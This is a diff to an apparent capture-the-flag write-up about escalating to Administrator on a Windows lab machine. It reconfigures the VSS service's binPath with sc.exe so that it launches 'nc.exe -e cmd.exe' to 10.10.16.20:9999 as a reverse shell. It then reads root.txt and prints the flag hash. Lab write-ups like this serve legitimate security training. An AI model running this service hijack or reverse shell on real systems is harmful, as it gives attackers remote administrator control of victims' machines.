@@ -64,3 +64,23 @@ sc.exe config vss binPath="C:\Users\svc-printer\Documents\shell.exe"
 As we started the sc.exe it got stuck which is an indication that we might got a shell finally
 ![[Pasted image 20240506041014.png]]
 
+<hr>
+
+I have changed the approached and uploaded a simple nc.exe file 
+```
+sc.exe config vss binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.16.20 9999"
+```
+![[Pasted image 20240506043343.png]]
+
+And got the stable shell as the approach described in the walkthrough didn't worked.
+```
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+```
+506018e945b364793fe8f27407c7436d
+```
+
+![[Pasted image 20240506043433.png]]
+
+So sometimes a simple approach can work fine.
